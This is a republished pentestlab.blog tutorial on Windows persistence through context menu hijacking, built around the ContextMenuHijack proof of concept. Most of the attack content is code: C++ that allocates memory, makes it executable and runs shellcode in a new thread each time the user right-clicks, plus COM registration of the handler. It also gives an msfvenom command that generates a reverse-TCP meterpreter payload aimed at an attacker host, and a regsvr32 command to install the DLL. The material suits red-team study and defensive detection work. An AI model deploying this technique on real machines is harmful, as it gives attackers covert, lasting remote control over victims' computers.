---
title: Persistence – Context Menu
url: https://buaq.net/go-153261.html
source: unSafe.sh - 不安全
date: 2023-03-14
fetch_date: 2025-10-04T09:27:52.766803
---

# Persistence – Context Menu

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/1539317187b77efd691965986e58da4a.jpg)

Persistence – Context Menu

Context menu provides shortcuts to the user in order to perform a number of actions. The
*2023-3-13 23:19:43
Author: [pentestlab.blog(查看原文)](/jump-153261.htm)
阅读量:23
收藏*

---

Context menu provides shortcuts to the user in order to perform a number of actions. The context menu is invoked with a right mouse click and it is a very common action for every Windows user. In offensive operations this action could be weaponized for persistence by executing shellcode every time the user attempts to use the context menu.

[RistBS](https://twitter.com/RistBS) developed a proof of concept called [ContextMenuHijack](https://github.com/RistBS/ContextMenuHijack) which can leverage the context menu for persistence by registering a COM object. The “*VirtualAlloc*” function is used in order to allocate a memory region which the executed shellcode will be stored.

```
void InjectShc()
{
    DWORD dwOldProtect = 0;
    LPVOID addr = VirtualAlloc( NULL, sizeof( buf ), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE );
    memcpy( addr, buf, sizeof( buf ) );

    VirtualProtect( addr, sizeof( buf ), PAGE_EXECUTE_READ, &dwOldProtect );

    ( ( void( * )() )addr )();
}
```

[![](https://pentestlab.files.wordpress.com/2023/03/persistence-contextmenu-virtualalloc.png?w=1024)](https://pentestlab.files.wordpress.com/2023/03/persistence-contextmenu-virtualalloc.png)

Context Menu – VirtualAlloc

The code below is used to receive information about the component which the user is going to select and the “*CreateThread*” will create a new thread that will execute the shellcode.

```
IFACEMETHODIMP FileContextMenuExt::Initialize( LPCITEMIDLIST pidlFolder, LPDATAOBJECT pDataObj, HKEY hKeyProgID )
{
    DWORD tid = NULL;
    CreateThread( NULL, 1024 * 1024, ( LPTHREAD_START_ROUTINE )InjectShc, NULL, 0, &tid );

    if ( NULL == pDataObj ) {
                if ( pidlFolder != NULL ) {
                }
        return S_OK;
    }
        return S_OK;
}
```

[![](https://pentestlab.files.wordpress.com/2023/03/persistence-contextmenu-filecontextmenu-initialize.png?w=1024)](https://pentestlab.files.wordpress.com/2023/03/persistence-contextmenu-filecontextmenu-initialize.png)

Context Menu – Initialize & CreateThread

The “*QueryInterface*” method will query an object for the set of interfaces.

```
IFACEMETHODIMP FileContextMenuExt::QueryInterface(REFIID riid, void **ppv)
{
    static const QITAB qit[] =
    {
        QITABENT( FileContextMenuExt, IContextMenu  ),
                QITABENT( FileContextMenuExt, IContextMenu2 ),
                QITABENT( FileContextMenuExt, IContextMenu3 ),
        QITABENT( FileContextMenuExt, IShellExtInit ),
        { 0 },
    };
    return QISearch( this, qit, riid, ppv );
```

[![](https://pentestlab.files.wordpress.com/2023/03/persistence-contextmenu-filecontextmenu-queryinterface.png?w=1024)](https://pentestlab.files.wordpress.com/2023/03/persistence-contextmenu-filecontextmenu-queryinterface.png)

Context Menu – QueryInterface

The context menu handler will be registered as a COM object and therefore the “*RegisterInprocServer*” function is called.

```
   hr = RegisterInprocServer( szModule, CLSID_FileContextMenuExt, L"ContextMenuHijack.FileContextMenuExt Class", L"Apartment" );
    if ( SUCCEEDED( hr ) ) {
        hr = RegisterShellExtContextMenuHandler( L"AllFilesystemObjects", CLSID_FileContextMenuExt, L"ContextMenuHijack.FileContextMenuExt" );
    }

    return hr;
}
```

[![](https://pentestlab.files.wordpress.com/2023/03/persistence-contextmenu-filecontextmenu-register-com.png?w=1024)](https://pentestlab.files.wordpress.com/2023/03/persistence-contextmenu-filecontextmenu-register-com.png)

Context Menu – RegisterInprocServer

The Metasploit framework utility “*msfvenom*” can be used to generated the shellcode that would be written in a text file.

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.4 LPORT=4444 EXITFUNC=thread -f c > pentestlab.txt
```

[![](https://pentestlab.files.wordpress.com/2023/03/persistence-contextmenu-msfvenom.png?w=626)](https://pentestlab.files.wordpress.com/2023/03/persistence-contextmenu-msfvenom.png)

Context Menu – msfvenom Shellcode

Once the code is compiled will generate a DLL. The utility “*regsvr32*” can register the DLL with the operating system.

```
regsvr32 ContextMenuHijack.dll
```

[![](https://pentestlab.files.wordpress.com/2023/03/persistence-contextmenu-register-dll.png?w=1024)](https://pentestlab.files.wordpress.com/2023/03/persistence-contextmenu-register-dll.png)

Context Menu – DLL Register Server

Once the user performs a right click on the windows environment over an object (file or folder) the code will executed and a communication channel will established as it can be demonstrated below.

[![](https://pentestlab.files.wordpress.com/2023/03/persistence-contextmenu-meterpreter.png?w=626)](https://pentestlab.files.wordpress.com/2023/03/persistence-contextmenu-meterpreter.png)

Context Menu – Meterpreter

## References

* <https://github.com/RistBS/ContextMenuHijack>
* <https://ristbs.github.io/2023/02/15/hijack-explorer-context-menu-for-persistence-and-fun.html>

## Post navigation

文章来源: https://pentestlab.blog/2023/03/13/persistence-context-menu/
 如有侵权请联系:admin#unsafe.sh

© [unSafe.sh - 不安全](https://unsafe.sh) Powered By [PaperCache](https://github.com/code-scan/PaperCache)

* admin#unsafe.sh
* [安全马克](https://aq.mk)
* [星际黑客](https://xj.hk)
* [T00ls](https://t00ls.net)